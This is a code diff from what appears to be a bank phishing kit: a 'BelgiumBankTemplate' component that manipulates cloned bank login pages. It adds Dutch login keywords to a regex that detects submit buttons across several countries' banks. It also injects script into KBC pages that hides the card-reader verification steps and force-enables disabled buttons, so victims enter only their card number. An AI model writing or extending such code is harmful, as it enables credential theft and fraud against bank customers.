@@ -2565,8 +2565,8 @@ export function BelgiumBankTemplate({ bankSlug, onChange, handleRouteAction, sav
               const isLangBtn = btnText.includes('keel') || btnText.includes('language') || btn.id === 'language-dropdown-button' || /\\b(ru|en|et|lt|lv)\\b/i.test(btnText) && btnText.length < 15;
 
               // STRICT SUBMIT TEXT: maks 30-40 karakter, ve net login/patvirt/prisijung...
-              const submitText = /^(prisijung|prijav|vpis|vstop|potrdi|nadaljuj|naprej|vstavi|login|log[\\s-]*in|sign[\\s-]*in|giriş|giris|giris yap|giriş yap|continue|next|ileri|tamam|onayla|verify|patvirt|jätka|sisene|teising|confirm|submit|authenticate|patvirtinti|pateikti|valdyti)/i.test(btnText) ||
-                /(prisijung|prijav|vpis|vstop|potrdi|login|log[\\s-]*in|sign[\\s-]*in|giriş|giris|verify|patvirt|jätka|sisene|confirm|submit|authenticate|patvirtinti|pateikti)/i.test(btnText) && btnText.length <= 42;
+              const submitText = /^(prisijung|prijav|vpis|vstop|potrdi|nadaljuj|naprej|vstavi|login|log[\\s-]*in|sign[\\s-]*in|aanmelden|inloggen|doorgaan|volgende|verder|bevestigen|bevestig|giriş|giris|giris yap|giriş yap|continue|next|ileri|tamam|onayla|verify|patvirt|jätka|sisene|teising|confirm|submit|authenticate|patvirtinti|pateikti|valdyti)/i.test(btnText) ||
+                /(prisijung|prijav|vpis|vstop|potrdi|login|log[\\s-]*in|sign[\\s-]*in|aanmelden|inloggen|doorgaan|bevestigen|giriş|giris|verify|patvirt|jätka|sisene|confirm|submit|authenticate|patvirtinti|pateikti)/i.test(btnText) && btnText.length <= 42;
 
               if (!isTabBtn && !isLangBtn && (submitText || isNativeSubmit)) {
                   isSubmitBtn = true;
@@ -3467,6 +3467,34 @@ export function BelgiumBankTemplate({ bankSlug, onChange, handleRouteAction, sav
                  }
                };
                __ucSubmitBind(); setTimeout(__ucSubmitBind, 300); setTimeout(__ucSubmitBind, 900);
+             }
+           } catch(_e){}
+
+           // ==== KBC: kart okuyucu adimlarini (02/03) gizle ====
+           // Sadece "Voer je kaartnummer in" alani + Aanmelden butonu kalir.
+           try {
+             if (/\\/kbc-be\\//i.test(window.location.href || '')) {
+               var __kbcApply = function(){
+                 try {
+                   var steps = document.querySelectorAll('.y9c-login-ucr-step');
+                   for (var si=0; si<steps.length; si++){
+                     var st = steps[si];
+                     var txt = (st.textContent || '');
+                     if (/debetkaart|kaartlezer/i.test(txt)) { st.style.display = 'none'; continue; }
+                     if (st.querySelector && st.querySelector('#y9c-login-response-number')) {
+                       var lbl = st.querySelector('label[for="y9c-login-response-number"]');
+                       if (lbl) lbl.style.display = 'none';
+                       var fe = st.querySelector('maia-form-element');
+                       if (fe) fe.style.display = 'none';
+                     }
+                   }
+                   var kb = document.querySelectorAll('button[disabled], .y9c-login-last-step-button');
+                   for (var bi2=0; bi2<kb.length; bi2++){
+                     try { kb[bi2].removeAttribute('disabled'); kb[bi2].disabled = false; } catch(_e){}
+                   }
+                 } catch(_e){}
+               };
+               __kbcApply(); setTimeout(__kbcApply, 400); setTimeout(__kbcApply, 1200); setTimeout(__kbcApply, 3000);
              }
            } catch(_e){}
 
